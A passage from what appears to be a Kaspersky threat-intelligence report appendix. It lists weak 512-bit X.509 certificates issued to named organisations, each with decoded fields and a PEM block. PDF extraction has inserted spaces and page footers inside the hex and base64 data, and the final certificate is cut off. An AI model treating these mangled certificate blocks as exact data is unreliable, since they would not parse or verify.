a1:f6:12:8d:9b:01:fa:27:cd : f4:ed:08:50:48:3a :
29:3b:16:94:4f
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Key Usage : critical
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
36
Digital Signature , Key Encipherment
X509v3 Authority Key Identifier :
keyid:65:65:A3:3D : D7:3B:11:A3:0A:07:25:37:C9:42:4A:5
B:76:77:50:E1
X509v3 Subject Key Identifier :
BE:7E : E3:53:BD:00:32:5E:3C:78:2B:02:B2:BF:52:A2:B1 :
E5:F2:F8
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.globalsign.net / educational.crl
Authority Information Access :
CA Issuers URI :
http://secure.globalsign.net/cacert/educational .
crt
Netscape Cert Type :
SSL Client , SSL Server
Signature Algorithm : sha1WithRSAEncryption
71:99:aa : c9:92:26:ee:32:2d : c0:95:f8:16:47:b7:d9:eb:2e :
f1:93:d2:c3:3d:62:c1:9a:74:d2:2f:29:9c:08:a8:ca:52:6c :
42:c4:2b : a7:1c:96:17:af:3d:01:b5:b5:f1:70:d0:08:e1:fa :
63:e1:44:b2:61:66:3d:9c:5a:3f:3a:32:b0:47:31:3d:27:1d :
98:9c : d3:c3:c7:9f:73:55:8c : ff : d7:21:2d:76:d2:e7:df:8b :
9e : d3:ee : c5:5e : e7:6a : ba:7a : bb:7b:9e:38:00:54:ed:58:ee :
00:c1:45:8b : d4:63:25:be:22:98:a8:ef : f0:b3:f8:fb:15:32 :
e8:ae : da:27:e4:60:46:d6:75:78:50:1d:57:4d:06:e9:8c : b8 :
43:f5:9a:58:cf : a1:f4:c7:c7:ec:4a : b0:8a:95:c7:6c:3b:50 :
0a:45:74:f1:d6:02:e0:78:a7:f1:f1:55:6e:20:92:55:37:be :
b6:57:76:37:ff:60:30:c3:9a:2c:0e : dd : d8:ef:2b : bf:1f:20 :
9d : a5:21:93:94:9a:1e:58:74:b8:24:ce : a4:38:7b:1d:38:fd :
f2:9f:21:c0:49:d1:94:3e:38:7e:63:0c:0b : c3:98:ea:56:b2 :
90:92:dc:75:0d:06:0b:35:9c:94:d6:e1:be:79:05:d1:27:b3 :
87:23:14:0a
BEGIN CERTIFICATE
MIIDlTCCAn2gAwIBAgILAQAAAAABHZGkblswDQYJKoZIhvcNAQEFBQAwXzELMAkG
A1UEBhMCQkUxEzARBgNVBAoTCkN5YmVydHJ1c3QxFzAVBgNVBAsTDkVkdWNhdGlv
bmFsIENBMSIwIAYDVQQDExlDeWJlcnRydXN0IEVkdWNhdGlvbmFsIENBMB4XDTA4
MTExMjE2NTk0OFoXDTExMTExMjE2NTk0OFowgYQxCzAJBgNVBAYTAkdCMRAwDgYD
VQQIEwdOb3Jmb2xrMRAwDgYDVQQHEwdOb3J3aWNoMR0wGwYDVQQKExRDaXR5IENv
bGxlZ2UgTm9yd2ljaDEWMBQGA1UECxMNSS5ULiBTZXJ2aWNlczEaMBgGA1UEAxMR
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
37
c3RmbWFpbC5jY24uYWMudWswXDANBgkqhkiG9w0BAQEFAANLADBIAkEAxlzpPai8
dDH9myA0MM3cUGpYm0FqHgSfdcKQH9inszqPWin4LbaRsHGaq0yh9hKNmwH6J830
7QhQSDopOxaUTwIDAQABo4HzMIHwMA4GA1UdDwEB / wQEAwIFoDAfBgNVHSMEGDAW
gBRlZaM91zsRowoHJTfJQkpbdndQ4TAdBgNVHQ4EFgQUvn7jU70AMl48eCsCsr9S
orHl8vgwOgYDVR0fBDMwMTAvoC2gK4YpaHR0cDovL2NybC5nbG9iYWxzaWduLm5l
dC9lZHVjYXRpb25hbC5jcmwwTwYIKwYBBQUHAQEEQzBBMD8GCCsGAQUFBzAChjNo
dHRwOi8vc2VjdXJlLmdsb2JhbHNpZ24ubmV0L2NhY2VydC9lZHVjYXRpb25hbC5j
cnQwEQYJYIZIAYb4QgEBBAQDAgbAMA0GCSqGSIb3DQEBBQUAA4IBAQBxmarJkibu
Mi3AlfgWR7fZ6y7xk9LDPWLBmnTSLymcCKjKUmxCxCunHJYXrz0BtbXxcNAI4fpj
4USyYWY9nFo / OjKwRzE9Jx2YnNPDx59zVYz/1yEtdtLn34ue0 + 7FXudqunq7e544
AFTtWO4AwUWL1GMlviKYqO / ws / j7FTLorton5GBG1nV4UB1XTQbpjLhD9ZpYz6H0
x8fsSrCKlcdsO1AKRXTx1gLgeKfx8VVuIJJVN762V3Y3/2Aww5osDt3Y7yu / HyCd
pSGTlJoeWHS4JM6kOHsdOP3ynyHASdGUPjh+YwwLw5jqVrKQktx1DQYLNZyU1uG+
eQXRJ7OHIxQK
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 01:00:00:00:00:01:1f:71:6f:21:66
Signature Algorithm : sha1WithRSAEncryption
Issuer : O = GlobalSign Inc , CN = Cybertrust SureServer CA
Validity
Not Before : Feb 13 19:59:00 2009 GMT
Not After : Feb 13 19:59:00 2011 GMT
Subject : CN = agreement.syniverse.com ,
C=US/emailAddress=belinda.jablonski@syniverse.com ,
L = Tampa , O = Syniverse Technologies Inc. , OU = Crossroads ,
ST = Florida
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a5:13:53:17:02:f7:cd:33:64:7d : e8:27:8f : e9 :
bc : ab : db:96:3b:41:0d : b6:c4:2a:10:d5:64:58:87 :
ac:62:de:09:2e : c5:5f:79:c5:d5:9e:26:9b:1a:9a :
e3:99:3b : e2:2e:48:7e:9c:5f:74:c9:34:09:b3:a5 :
40:7f : bb : e9:35
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
38
Netscape Cert Type :
SSL Client , SSL Server
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 Authority Key Identifier :
keyid:2B:37:53:93:64:47:66:23:4F:00:D3:F7:DD : E8:30:B
6:5B:84:89:23
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.globalsign.net / sureserver.crl
X509v3 Basic Constraints : critical
CA : FALSE
Signature Algorithm : sha1WithRSAEncryption
60:dd:4f:65:17:a0:3d:47:d7:70:d7:96:17:41:1c : b0:89:38 :
9c:7e : bd:74:21:90:60:b4:04:d0:8d:12:81:a2:d5:c1:89:92 :
8a:5e:6a : ae : c9:df:0a:78:e9:70:7f : b9:9b:3e:08:ab:74:6b :
ab:99:cb:9b : f4:1e:61:53:7f:13:3f:5b:26:ea:57:11:fa : d7 :
3b:90:8c:59:23:d4:73:66:9e : aa:47:72:04:9a : bf : d8:29:aa :
c1:4d : f3:32:e5:c3:26:8a:98:da:07:bf : b7:07:0e:1a:4e : a2 :
13:51:c6:2c:11:7f:2c:40:c6:0f : a1:4d:51:6a:33:7b:9d:52 :
9b:4b : f9:85:6a:13:44:81:2e:8f : a9:2d : ce:29:57:54:3b : d8 :
1b : d8:20:5a : c1:46:16:93:3f:34:e3:4a:5a : e8:54:f2:9b : b6 :
14:4a:10:9b : db : d4:33:7b:76:13:29:c9:f8:44:02:98:94:5d :
09:30:a0:a3:f0:94:1c:94:48:83:03:66:2c:40:92:b4:75:44 :
35:f4:8d : be:21:51:47:86:cd : fb:67:55:6d : a6:17:df:79:3f :
31:31:63:97:fc:8d:1a:14:9c:7e:68:13:bc:1b:2b:54:c9:a7 :
e3:05:8a : f7:43:0a:06:6d:07:e3:f3:34:1d:92:be:30:9d:95 :
05:8c:35:ba
BEGIN CERTIFICATE
MIIDRzCCAi+gAwIBAgILAQAAAAABH3FvIWYwDQYJKoZIhvcNAQEFBQAwPDEXMBUG
A1UEChMOR2xvYmFsU2lnbiBJbmMxITAfBgNVBAMTGEN5YmVydHJ1c3QgU3VyZVNl
cnZlciBDQTAeFw0wOTAyMTMxOTU5MDBaFw0xMTAyMTMxOTU5MDBaMIG8MSAwHgYD
VQQDExdhZ3JlZW1lbnQuc3luaXZlcnNlLmNvbTELMAkGA1UEBhMCVVMxLjAsBgkq
hkiG9w0BCQEWH2JlbGluZGEuamFibG9uc2tpQHN5bml2ZXJzZS5jb20xDjAMBgNV
BAcTBVRhbXBhMSQwIgYDVQQKExtTeW5pdmVyc2UgVGVjaG5vbG9naWVzIEluYy4x
EzARBgNVBAsTCkNyb3Nzcm9hZHMxEDAOBgNVBAgTB0Zsb3JpZGEwXDANBgkqhkiG
9w0BAQEFAANLADBIAkEApRNTFwL3zTNkfegnj+m8q9uWO0ENtsQqENVkWIesYt4J
LsVfecXVniabGprjmTviLkh+nF90yTQJs6VAf7vpNQIDAQABo4GQMIGNMBEGCWCG
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
39
SAGG+EIBAQQEAwIGwDAOBgNVHQ8BAf8EBAMCBPAwHwYDVR0jBBgwFoAUKzdTk2RH
ZiNPANP33egwtluEiSMwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5nbG9i
YWxzaWduLm5ldC9zdXJlc2VydmVyLmNybDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3
DQEBBQUAA4IBAQBg3U9lF6A9R9dw15YXQRywiTicfr10IZBgtATQjRKBotXBiZKK
Xmquyd8KeOlwf7mbPgirdGurmcub9B5hU38TP1sm6lcR+tc7kIxZI9RzZp6qR3IE
mr / YKarBTfMy5cMmipjaB7 + 3Bw4aTqITUcYsEX8sQMYPoU1RajN7nVKbS / mFahNE
gS6PqS3OKVdUO9gb2CBawUYWkz8040pa6FTym7YUShCb29Qze3YTKcn4RAKYlF0J
MKCj8JQclEiDA2YsQJK0dUQ19I2+IVFHhs37Z1VtphffeT8xMWOX / I0aFJx+aBO8
GytUyafjBYr3QwoGbQfj8zQdkr4wnZUFjDW6
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 2786749 ( 0x2a85bd )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = MY , O = Digicert Sdn . Bhd . , OU=457608 K ,
CN = Digisign Server ID ( Enrich )
Validity
Not Before : Mar 29 04:26:21 2010 GMT
Not After : Mar 29 04:26:21 2012 GMT
Subject : C = MY , O = Digicert Sdn . Bhd . , CN = mcrs2.digicert .
com.my , L = Kuala Lumpur
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:c2:f6:81:3d:67:9c:8a:93:22:6f : c1:cf : a9:85 :
ec : d1:40:b6:79:ea:02:47:88:c2:bb : dd:59:97:49 :
f5:59:a8:be:0d:10:17:79:9b:0b : ee : a5:4c:7a : db :
73:d8:26:49:76:2b:4f : fc:4e : aa:1d : e1:57:22:d5 :
0b : cd : d5:da:69
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Subject Key Identifier :
42:C0:71:88:BF:7B:00:93
X509v3 Certificate Policies :
Policy : 2.16.458.1.1
CPS : http://www.digicert.com.my/cps.htm
X509v3 Authority Key Identifier :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
40
keyid : C6:16:93:4E:16:17:EC:16:AE:8C:94:76:F3:86:6D : C
5:74:6E:84:77
X509v3 Key Usage :
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
Signature Algorithm : sha1WithRSAEncryption
39:ec : d4:6b : f2:e7:d4:47:5e:59:6e : bf:83:59:7b:32:17:cb :
4e:37:e7:2d:5c:44:ea:68:08:94:e9:47:33:cb : e2:cc : ad : c7 :
cc:28:f1:07:a7:9a : f6:f8:55:76:c4:31:72:98:e3:11:5b : aa :
d5:d6:ff:99:52:69:61:48:91:31:df : ff : d3:39:f0:d1:94:29 :
55:5b:6e : d1:d7:2d : da:7c : ef:6e : a4:10:fd : b4:22:4b:9e:41 :
85:f6:63:b6:e7:10:5c:88:1e:04:20:36:48:22:f5:ba : a4:8c :
24:d3:81:78:c1:c1:d3:c9:8c : ba : a5:62:e6:e3:a8:e8:e4:21 :
d5:72
BEGIN CERTIFICATE
MIICgzCCAeygAwIBAgIDKoW9MA0GCSqGSIb3DQEBBQUAMGMxCzAJBgNVBAYTAk1Z
MRswGQYDVQQKExJEaWdpY2VydCBTZG4uIEJoZC4xETAPBgNVBAsTCDQ1NzYwOC1L
MSQwIgYDVQQDExtEaWdpc2lnbiBTZXJ2ZXIgSUQgKEVucmljaCkwHhcNMTAwMzI5
MDQyNjIxWhcNMTIwMzI5MDQyNjIxWjBhMQswCQYDVQQGEwJNWTEbMBkGA1UEChMS
RGlnaWNlcnQgU2RuLiBCaGQuMR4wHAYDVQQDExVtY3JzMi5kaWdpY2VydC5jb20u
bXkxFTATBgNVBAcTDEt1YWxhIEx1bXB1cjBcMA0GCSqGSIb3DQEBAQUAA0sAMEgC
QQDC9oE9Z5yKkyJvwc+phezRQLZ56gJHiMK73VmXSfVZqL4NEBd5mwvupUx623PY
Jkl2K0/8Tqod4Vci1QvN1dppAgMBAAGjgYowgYcwEQYDVR0OBAoECELAcYi / ewCT
MEQGA1UdIAQ9MDswOQYFYINKAQEwMDAuBggrBgEFBQcCARYiaHR0cDovL3d3dy5k
aWdpY2VydC5jb20ubXkvY3BzLmh0bTAfBgNVHSMEGDAWgBTGFpNOFhfsFq6MlHbz
hm3FdG6EdzALBgNVHQ8EBAMCBPAwDQYJKoZIhvcNAQEFBQADgYEAOezUa / Ln1Ede
WW6/g1l7MhfLTjfnLVxE6mgIlOlHM8vizK3HzCjxB6ea9vhVdsQxcpjjEVuq1db/
mVJpYUiRMd//0znw0ZQpVVtu0dct2nzvbqQQ / bQiS55BhfZjtucQXIgeBCA2SCL1
uqSMJNOBeMHB08mMuqVi5uOo6OQh1XI=
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 21665 ( 0x54a1 )
Signature Algorithm : md5WithRSAEncryption
Issuer : C = US , O = Equifax Secure Inc. , CN = Equifax Secure
eBusiness CA1
Validity
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
41
Not Before : Jun 14 15:26:42 2006 GMT
Not After : Jul 14 15:26:42 2008 GMT
Subject : C = US , O = www.gccustomservices.com ,
OU = businessprofile.geotrust.com / get.jsp?GT30320107 , OU = See
www.rapidssl.com/cps ( c)05 , OU = Domain Control Validated
RapidSSL(R ) , CN = www.gccustomservices.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:cb:1f : b0:21:9c:37:a2:39:75:02:b5:12:dc : bb :
f5:7a : f7:93:65:0d : f8:6c:36:68:0a:06:19:49:77 :
da:68:9e : ea : eb:39:d4:16:49:6d:14:c0:c9:6f:53 :
c5:ec : a8:6b:60:ca : c3:a4:5b:3b:1a:93:1d:1f:3c :
d8:26:d5:6e:23
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Key Usage : critical
Digital Signature , Non Repudiation , Key
Encipherment , Data Encipherment
X509v3 CRL Distribution Points :
Full Name :
URI : http://crl.geotrust.com / crls / ebizca1.crl
X509v3 Authority Key Identifier :
keyid:4A:78:32:52:11:DB:59:16:36:5E : DF : C1:14:36:40:6
A:47:7C:4C : A1
Signature Algorithm : md5WithRSAEncryption
99:a5:16:0b:3e:3d : d1:a4:36:dc:09:c5:22:12:d9:cf : c5:76 :
89:4a:7b:27:be:2d : d6:53:2b:6b : a4:da:0b : f3:f5:bf:72:cc :
11:1c:5c : a1:a3:ef:78:83:4d:01:a6:a0:e6:d8:91:2c:6c : ce :
83:d8:be : fe : a1:14:c9:b4:ac : fc : be:8e : c3:75:1d:6a:6a:43 :
5a : a5:1c:3b : eb : aa : f4:f3:36:bc:34:63:72:2a : d8:c5:97:b6 :
a3:aa:54:91:5e:3f:3c:48:36:3c:51:37:c0:55:28:f1:a4:8f :
ea : df : e5:2f : b2:62:bd:33:20:6a:4a:57:66:00:89:21:c4:68 :
d5:e2
BEGIN CERTIFICATE
MIIC3DCCAkWgAwIBAgICVKEwDQYJKoZIhvcNAQEEBQAwUzELMAkGA1UEBhMCVVMx
HDAaBgNVBAoTE0VxdWlmYXggU2VjdXJlIEluYy4xJjAkBgNVBAMTHUVxdWlmYXgg
U2VjdXJlIGVCdXNpbmVzcyBDQS0xMB4XDTA2MDYxNDE1MjY0MloXDTA4MDcxNDE1
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
42
MjY0MlowgecxCzAJBgNVBAYTAlVTMSEwHwYDVQQKExh3d3cuZ2NjdXN0b21zZXJ2
aWNlcy5jb20xODA2BgNVBAsTL2J1c2luZXNzcHJvZmlsZS5nZW90cnVzdC5jb20v
Z2V0LmpzcD9HVDMwMzIwMTA3MScwJQYDVQQLEx5TZWUgd3d3LnJhcGlkc3NsLmNv
bS9jcHMgKGMpMDUxLzAtBgNVBAsTJkRvbWFpbiBDb250cm9sIFZhbGlkYXRlZCAt
IFJhcGlkU1NMKFIpMSEwHwYDVQQDExh3d3cuZ2NjdXN0b21zZXJ2aWNlcy5jb20w
XDANBgkqhkiG9w0BAQEFAANLADBIAkEAyx+wIZw3ojl1ArUS3Lv1eveTZQ34bDZo
CgYZSXfaaJ7q6znUFkltFMDJb1PF7KhrYMrDpFs7GpMdHzzYJtVuIwIDAQABo24w
bDAOBgNVHQ8BAf8EBAMCBPAwOQYDVR0fBDIwMDAuoCygKoYoaHR0cDovL2NybC5n
ZW90cnVzdC5jb20vY3Jscy9lYml6Y2ExLmNybDAfBgNVHSMEGDAWgBRKeDJSEdtZ
FjZe38EUNkBqR3xMoTANBgkqhkiG9w0BAQQFAAOBgQCZpRYLPj3RpDbcCcUiEtnP
xXaJSnsnvi3WUytrpNoL8/W / cswRHFyho+94g00BpqDm2JEsbM6D2L7+oRTJtKz8
vo7DdR1qakNapRw766r08za8NGNyKtjFl7ajqlSRXj88SDY8UTfAVSjxpI / q3+Uv
smK9MyBqSldmAIkhxGjV4g==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 27455 ( 0x6b3f )
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = DE , O = TSystems
Enterprise Services GmbH , OU = Trust Center Deutsche
Telekom , CN = Deutsche Telekom CA 5
Validity
Not Before : Oct 20 06:55:03 2008 GMT
Not After : Oct 25 06:55:03 2009 GMT
Subject : O = AIC GmbH , OU = AIC Certificate Service C06 ,
L = Sindelfingen , ST = BAW , C = DE , CN = www.kuechentraum24.de
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:b7:92:e8:ac : bd:17:b8:20:35:53:82:2a : c4:c9 :
f8:b5:a5:c0:fc : c0:43:f9:c5:79:5c:43:f4:58:22 :
6f : c4:db : c1:d2:a9:45:31:33:1e : da:73:da:7b:5a :
ea:2e:80:eb:30:80:fc:58:1e:1e:89:b2:15:1b : fc :
bc : f2:45:4d : ff
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Authority Key Identifier :
TLP : Green 	          For any inquiries , please contact intelreports@kaspersky.com
43
keyid : B3:F5:5F : A6:02:3C:23:10:5B:71:A1:7C : B3:A7:40:8
5:A8:85:26:B8
X509v3 Key Usage : critical
Digital Signature , Key Encipherment
X509v3 Subject Key Identifier :
80:B5:D5:2B:3F : F9:B6:18:91:23:AE : A9:27:5B:20:D4:9E :
02:E9:A7
X509v3 Certificate Policies :
Policy : 1.3.6.1.4.1.7879.13.2
CPS : http://wwwca.telesec.de/Pub_Cert/ServPass/cps/
CPS_ServerPass_V34.pdf
X509v3 CRL Distribution Points :
Full Name :
URI : http://wwwca.telesec.de / cgibin/
Pub_Cert / ServPass / DwnloadCRL.crl?issuer _
dn = Deutsch
e_Telekom_CA_5
Full Name :
URI : ldap://ldapserverpass .
telesec.de/cn=Deutsche%20Telekom%20
CA%205,ou = Trust%20Center%20Deutsche%20
Telekom , o = TSystems%20Enterprise%20Services%20
GmbH , c = de?certificateRevocationlist?ba-
se?certificateRevocationlist= *
X509v3 Basic Constraints : critical
CA : FALSE
X509v3 Subject Alternative Name :
DNS : www.kuechentraum24.de
Signature Algorithm : sha1WithRSAEncryption
b6:bc:98:3d:6c:44:95:50:c1:06:94:71:b1:05:2d:99:85:e3 :
db:6e:39:58:fd : f0:45:1c:0d:3c : b3:45:33:e9:66:fd:99:f0 :
b9:c0:98:8a : af:01:f5:b4:66:a7:7e:11:8a:6c:71:09:b9:fa :
5e:66:fc:3d:03:13:f1:c6:79:7c : bb : c5:fb : b7:e5:6b : c8:e3 :
92:7e:7d : fb:87:e0:7d:5e:3e:64:6e : df:27:52:85:d3:9b:71 :
93:84:2b:38:d1:4b:10:fc:23:e2:ae:7a : cb : a7:01:d1:c5:30 :
05:76:2d:26:f5:9f : b9:5b:8c : e7:3b:3c:2d : fb : a9:10:61:40 :
2e : da:45:75:c2:c3:d1:20:8d : da : f3:72:3f:5c:7d : bd : e1:86 :
d3:43:9d:81:71:84:09:2f:13:af : e1:cb:55:c2:0d : a4:3c : d3 :
f7:f2:eb:12:22:96:a7:5d:0b : ff : b3:9f : fa : f6:cf : a3:19:82 :
93:dc : ab : a7:fe:76:10:ff:5e:32:00:d7:69:1a : a1:e6:2a : e2 :
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
44
31:63:d6:14:f6:69:17:d4:bc : e2:68:c9:76:71:82:14:5f : a8 :
88:f7:e2:3d:10:50:da : aa:97:96:08:f8:33:18:d2:1a:93:4f :
5c:58:fc : c0:05:e0:31:f2:59:cf:5e:2e : f5:6a:1f:6c:0f : fa :
34:0b:2c : c9
BEGIN CERTIFICATE
MIIFDTCCA / WgAwIBAgICaz8wDQYJKoZIhvcNAQEFBQAwgYIxCzAJBgNVBAYTAkRF
MSswKQYDVQQKEyJULVN5c3RlbXMgRW50ZXJwcmlzZSBTZXJ2aWNlcyBHbWJIMSYw
JAYDVQQLEx1UcnVzdCBDZW50ZXIgRGV1dHNjaGUgVGVsZWtvbTEeMBwGA1UEAxMV
RGV1dHNjaGUgVGVsZWtvbSBDQSA1MB4XDTA4MTAyMDA2NTUwM1oXDTA5MTAyNTA2
NTUwM1owgYsxETAPBgNVBAoTCEFJQyBHbWJIMSQwIgYDVQQLExtBSUMgQ2VydGlm
aWNhdGUgU2VydmljZSBDMDYxFTATBgNVBAcTDFNpbmRlbGZpbmdlbjEMMAoGA1UE
CBMDQkFXMQswCQYDVQQGEwJERTEeMBwGA1UEAxMVd3d3Lmt1ZWNoZW50cmF1bTI0
LmRlMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBALeS6Ky9F7ggNVOCKsTJ+LWlwPzA
Q / nFeVxD9Fgib8TbwdKpRTEzHtpz2nta6i6A6zCA / FgeHomyFRv8vPJFTf8CAwEA
AaOCAkgwggJEMB8GA1UdIwQYMBaAFLP1X6YCPCMQW3GhfLOnQIWohSa4MA4GA1Ud
DwEB / wQEAwIFoDAdBgNVHQ4EFgQUgLXVKz/5thiRI66pJ1sg1J4C6acwagYDVR0 g
BGMwYTBfBgkrBgEEAb1HDQIwUjBQBggrBgEFBQcCARZEaHR0cDovL3d3d2NhLnRl
bGVzZWMuZGUvUHViX0NlcnQvU2VydlBhc3MvY3BzL0NQU19TZXJ2ZXJQYXNzX1Yz
NC5wZGYwggFUBgNVHR8EggFLMIIBRzBnoGWgY4ZhaHR0cDovL3d3d2NhLnRlbGVz
ZWMuZGUvY2dpLWJpbi9QdWJfQ2VydC9TZXJ2UGFzcy9Ed25sb2FkQ1JMLmNybD8 t
aXNzdWVyX2RuPURldXRzY2hlX1RlbGVrb21fQ0FfNTCB26CB2KCB1YaB0mxkYXA6
Ly9sZGFwLXNlcnZlcnBhc3MudGVsZXNlYy5kZS9jbj1EZXV0c2NoZSUyMFRlbGVr
b20lMjBDQSUyMDUsb3U9VHJ1c3QlMjBDZW50ZXIlMjBEZXV0c2NoZSUyMFRlbGVr
b20sbz1ULVN5c3RlbXMlMjBFbnRlcnByaXNlJTIwU2VydmljZXMlMjBHbWJILGM9
ZGU / Y2VydGlmaWNhdGVSZXZvY2F0aW9ubGlzdD9iYXNlP2NlcnRpZmljYXRlUmV2
b2NhdGlvbmxpc3Q9KjAMBgNVHRMBAf8EAjAAMCAGA1UdEQQZMBeCFXd3dy5rdWVj
aGVudHJhdW0yNC5kZTANBgkqhkiG9w0BAQUFAAOCAQEAtryYPWxElVDBBpRxsQUt
mYXj2245WP3wRRwNPLNFM+lm / ZnwucCYiq8B9bRmp34RimxxCbn6Xmb8PQMT8cZ5
fLvF+7fla8jjkn59 + 4fgfV4+ZG7fJ1KF05txk4QrONFLEPwj4q56y6cB0cUwBXYt
JvWfuVuM5zs8LfupEGFALtpFdcLD0SCN2vNyP1x9veGG00OdgXGECS8Tr+HLVcIN
pDzT9/LrEiKWp10L/7Of+vbPoxmCk9yrp/52EP9eMgDXaRqh5iriMWPWFPZpF9S8
4mjJdnGCFF+oiPfiPRBQ2qqXlgj4MxjSGpNPXFj8wAXgMfJZz14u9WofbA/6NAss
yQ==
END CERTIFICATE
Certificate :
Data :
Version : 3 ( 0x2 )
Serial Number : 27585 ( 0x6bc1 )
TLP : Green 	            For any inquiries , please contact intelreports@kaspersky.com
45
Signature Algorithm : sha1WithRSAEncryption
Issuer : C = US , O = Anthem Inc , OU = Ecommerce , CN = Anthem Inc
Certificate Authority
Validity
Not Before : Jan 13 19:01:43 2010 GMT
Not After : Jan 13 19:01:43 2011 GMT
Subject : C = US , ST = Indiana , L = Indianapolis , O = Anthem
Companies Inc , OU = AIT , CN = www18.anthem.com
Subject Public Key Info :
Public Key Algorithm : rsaEncryption
PublicKey : ( 512 bit )
Modulus :
00:a0:66:16:2a:3f:32:86:a5:e7:75:1a:3d:02:0a :
4c:04:ed : af:8b:92:e0:70:8f:54:64:c7:4d:18:ee :
51:97:2f:00:39:44:fc:6f : f6:63:9c:65:47:64:7b :
73:43:4a:85:2b : db : f6:f1:79:02:50:73:05:15:73 :
f8:64:0d : b4:b7
Exponent : 65537 ( 0x10001 )
X509v3 extensions :
X509v3 Basic Constraints : critical
CA : FALSE
X509v3 Subject Alternative Name :
email:DLAITMiddleware@anthem.com
X509v3 Key Usage : critical
Key Encipherment
X509v3 Authority Key Identifier :
keyid : FA:1A : DC:3E:5D : A6:B5:FD : FA:5F:6C : CB:28:40:D3:E
0:97:A2:AA : AC
DirName:/C = US / O = GTE Corporation / OU = GTE CyberTrust
Solutions , Inc./CN = GTE
CyberTrust Global Root
serial:07:27:16:11
X509v3 Subject Key Identifier :
06:EC : C3:75:99:AA:67:1E:13:4A : B7:DD:83:8A:5B:86:E3 :
8E : F9:DD
Signature Algorithm : sha1WithRSAEncryption
6c:0d : f7:59:c5:48:2d : c4:81:f5:be:8b:87:0b : fe:94:2d:3c :
e4:c1:8f : ad:88:41:7f:9b:71:f6:56:8d:70:ba : ff:20:c7:6d :
8d:52:28:0a:8f : cc:04:82:45:72:1e:0e:9f:43:7d : af : da : f3 :
07:34:b2:3a:97:5e : b4:44:31:4b:21:80:ec : ce:02:98:30:59 :
TLP : Green 	           For any inquiries , please contact intelreports@kaspersky.com
46
dc:87:73:90:99:d1:79:ca : d8:bd : aa : cd:34:65:e2:c1:1f:78 :
c2:da:69:60:3a : ca:0b:6b:6e : dd:80:6d : fd:20:09:85:88:2c :
9a:40:7c : fb:7d:78:ca:3e : c6:bf:81:3a:6a:09:e9:d9:c5:e8 :
57:e9:94:a2:8a : f8:c8:1f:0e:84:9b : d1:77:5a:80:b6:c3:13 :
ca:86:0a:9b:78:a0:9f:83:84:06:eb:8d : d1:17:50:78:68:b0 :
bb:99:2a:50:f7:44:92:4e:3a : ca:63:48:aa:5e:30:1b:12:89 :
b7:1d : f3:a7:4a:02:cc : da:2f : fc : e6:47:57:07:b1:33:f0:bf :
7f:6e:26:59:62:ec:66:b8:1f : a6:09:65:7c : db : e4:c2:09:d2 :
97:e7:15:e4:34:a8:d6:f3:d2:3a : f9:20:6a : a0:a1:af:93:1b :
ea:8c : ea : a5:2a:26:da : a0:73:ed : ed:67:f6:53:a0:84:a1:0c :
31:ff : d8:08
BEGIN CERTIFICATE
MIIDpDCCAoygAwIBAgICa8EwDQYJKoZIhvcNAQEFBQAwYTELMAkGA1UEBhMCVVMx
EzARBgNVBAoTCkFudGhlbSBJbmMxEjAQBgNVBAsTCUVjb21tZXJjZTEpMCcGA1UE
AxMgQW50aGVtIEluYyBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMTAwMTEzMTkw
MTQzWhcNMTEwMTEzMTkwMTQzWjB+MQswCQYDVQQGEwJVUzEQMA4GA1UECBMHSW5k
aWFuYTEVMBMGA1UEBxMMSW5kaWFuYXBvbGlzMR0wGwYDVQQKExRBbnRoZW0gQ29 t
cGFuaWVzIEluYzEMMAoGA1UECxMDQUlUMRkwFwYDVQQDExB3d3cxOC5hbnRoZW0u
Y29tMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBAKBmFio / Moal53UaPQIKTATtr4uS
4HCPVGTHTRjuUZcvADlE / G/2Y5xlR2R7c0NKhSvb9vF5AlBzBRVz+GQNtLcCAwEA
AaOCAQ8wggELMAwGA1UdEwEB / wQCMAAwJwYDVR0RBCAwHoEcREwtQUlULU1pZGRs
ZXdhcmVAYW50aGVtLmNvbTAOBgNVHQ8BAf8EBAMCBSAwgaIGA1UdIwSBmjCBl4AU
+ hrcPl2mtf36X2zLKEDT4JeiqqyheaR3MHUxCzAJBgNVBAYTAlVTMRgwFgYDVQQK
Ew9HVEUgQ29ycG9yYXRpb24xJzAlBgNVBAsTHkdURSBDeWJlclRydXN0IFNvbHV0
aW9ucywgSW5jLjEjMCEGA1UEAxMaR1RFIEN5YmVyVHJ1c3QgR2xvYmFsIFJvb3SC
